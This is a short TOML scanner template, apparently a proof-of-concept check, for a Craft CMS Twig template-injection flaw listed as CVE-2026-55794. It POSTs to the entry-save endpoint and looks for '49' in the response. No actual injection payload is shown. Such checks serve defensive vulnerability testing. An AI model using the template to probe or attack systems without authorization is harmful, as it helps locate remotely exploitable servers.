[info]
author = "AVE"
description = "Craft CMS 5.9.0-5.10.0 控制面板条目编辑时，HTTP Referer 头中的签名重定向 URL 被 renderObjectTemplate() 编译为 Twig 模板执行，导致认证用户可注入恶意 Twig 代码实现 RCE"
id = "POC-AVE-2026-0636"
name = "CVE-2026-55794 PoC"
severity = "high"
tags = ["cve-2026-55794"]
vuln_id = [
    "CVE-2026-55794",
    "AVE-2026-0636",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/entries/save-entry"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["49"]
